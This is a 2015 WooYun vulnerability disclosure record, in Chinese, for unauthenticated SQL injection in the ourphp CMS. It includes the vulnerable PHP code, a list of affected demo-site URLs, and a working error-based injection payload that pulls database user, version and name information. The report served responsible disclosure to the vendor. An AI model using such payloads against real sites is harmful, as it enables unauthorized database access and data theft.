{"id": 33638, "wybug_id": "wooyun-2015-0108359", "wybug_title": "ourphp最新版设计缺陷导致注入漏洞", "wybug_corp": "ourphp.net", "wybug_author": "路人甲", "wybug_date": "2015-04-16 17:19", "wybug_open_date": "2015-07-16 16:30", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-20：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-16：\t细节向公众公开  简要描述： ourphp最新版设计缺陷导致大量注入漏洞通杀全站（包括手机站，几十个漏洞打包） 详细说明：  看到wooyun上ourphp这个厂商又出新的版本了，说修改了wooyun上现有的漏洞，我也来凑凑热闹吧。下载最新版本（ourphp_v1.2.0.20150414），2015-04-14更新的，研究学习一下。先说一下是如何造成如此之多的漏洞的：Ourphp的url都是形如这样：http://demo.ourphp.net/?cn-job-7.html，其中的cn-job-7.html会被解析成cn、job、7三个参数，这里的cn参数存在注入漏洞，而整个ourphp的网站几乎都是这种类型的url。这里罗列几个无需登陆的：\nhttp://demo.ourphp.net/?cn-job-7.htmlhttp://demo.ourphp.net/?cn-shop.htmlhttp://demo.ourphp.net/?cn-product-11.html (包含多个)http://demo.ourphp.net/?cn-article-2.htmlhttp://demo.ourphp.net/?cn-photo-4.htmlhttp://demo.ourphp.net/?cn-video-5.htmlhttp://demo.ourphp.net/?cn-down-6.htmlhttp://demo.ourphp.net/?cn-about-8.htmlhttp://demo.ourphp.net/?cn-club.htmlhttp://demo.ourphp.net/?cn-about-10.htmlhttp://demo.ourphp.net/?cn-clubview-1.htmlhttp://demo.ourphp.net/?cn-jobview-7-5.htmlhttp://demo.ourphp.net/?cn-productview-16-26.htmlhttp://demo.ourphp.net/?cn-videoview-5-5.html等等等等等等等等\n前台登陆以后的：\nhttp://demo.ourphp.net/?cn-shoppingcart.htmlhttp://demo.ourphp.net/client/user/?cn-usershopping.htmlhttp://demo.ourphp.net/client/user/?cn-userpay.htmlhttp://demo.ourphp.net/client/user/?cn-usermail.htmlhttp://demo.ourphp.net/client/user/?cn-useredit.html等等等等等等等等\n贴个图再说下cn下的模板就有这么多，还不算多个参数组合的，这里就不写了吧\n\n来看看代码是如何注入的，比较难发现在网站主页index.php （client/user等中类似）中\n<?phpif(version_compare(PHP_VERSION,'5.0.0','<'))  die('错误！您的PHP版本不能低于 5.0.0 !');if (!file_exists(\"./function/install/ourphp.lock\")) {\theader(\"location: ./function/install/index.php\");\texit;}include './config/ourphp_code.php';include './config/ourphp_config.php';include './config/ourphp_version.php';include './config/ourphp_Language.php';include './function/ourphp_function.class.php';include './function/ourphp/Smarty.class.php';include './function/ourphp_system.class.php';include './function/ourphp_template.class.php';?>\n包含了这么一个文件： './function/ourphp_system.class.php';去跟进看看\n$smarty->assign('mobile',isMobile());$smarty->registerFilter('pre','smartyt');$smarty->assign('ourphp_web',ourphp_web());$smarty->assign('column',indexcolumn());$smarty->assign('ip',getIP());$smarty->assign('ad',array('head'=>ourphp_adoverall('head',$temptype),'foot'=>ourphp_adoverall('foot',$temptype),'list'=>ourphp_adoverall('list',$temptype),'view'=>ourphp_adoverall('view',$temptype)));$smarty->assign('advert',array('float'=>ourphp_ad('Float'),'right'=>ourphp_ad('Right'),'double'=>ourphp_ad('Double')));$smarty->assign('brandclass',ourphp_brand());\n其中又有这么一句$smarty->assign('column',indexcolumn());，调用了indexcolumn()，跟进\nfunction indexcolumn() {     global $db,$ourphp_Language,$ourphp_webpath,$Parameterse; \t$query = $db-> sqllist(\"select id,OP_Uid,OP_Lang,OP_Columntitle,OP_Columntitleto,OP_Model,OP_Url,OP_Briefing,OP_Img from `ourphp_column` where OP_Hide = 0 and OP_Lang = '\".$ourphp_Language.\"' order by OP_Sorting asc,id desc\");\t无关代码\n看到$ourphp_Language被带入sql执行了。$ourphp_Language又是怎么得到的呢？还是在被包含的这个文件里：'./function/ourphp_system.class.php'\n$ourphp_weburl = explode('-',$_SERVER[\"QUERY_STRING\"]);if (empty($ourphp_weburl[0])){$ourphp_Language = 'cn';}else{$ourphp_Language = $ourphp_weburl[0];}\n整个过程中都没有对QUERY_STRING中的第一个参数进行过滤处理，造成了注入。整个网站存在的太多，这里一起提交了。希望一起修复。Payload:GET提交\n/?'/**/UNION/**/SELECT/**/1/**/FROM(SELECT/**/COUNT(*),CONCAT(0x23,(SELECT/**/concat(user(),0x23,version(),0x23,database())/**/FROM/**/ourphp_admin/**/LIMIT/**/0,1),0x23,FLOOR(RAND(0)*2))x/**/FROM/**/INFORMATION_SCHEMA.tables/**/GROUP/**/BY/**/x)a/**/where/**/'1%3d1-usershopping.html-\n本地测试如下：\n\n官方demo测试如下：\n\nDemo的数据库user为：ourphp@localhostDemo的Mysql版本：5.5.37Demo的数据库：ourphp   漏洞证明：  见 详细说明   修复方案：  你比我懂   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-04-17 16:29 厂商回复： 谢谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-16 18:53 |    \t\tPythonPig \t\t\t( 普通白帽子  |\t\t\t        Rank:491 漏洞数:71        | 只会简单工具的小小菜)\t\t \n  @xsser @疯狗 @Finger @浩天标题被改了，而且改错了，这个漏洞没有任何限制，登陆都不需要，我在详细说明的最后说mysql版本说的是注入出来的官方demo的数据库版本，并不是这个漏洞的限制条件，希望能得到处理，希望把标题改为:ourphp最新版设计缺陷导致注入漏洞通杀全站（几十个漏洞打包）就算改标题，也不要改的这么面目全非而且还改错了吧？    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}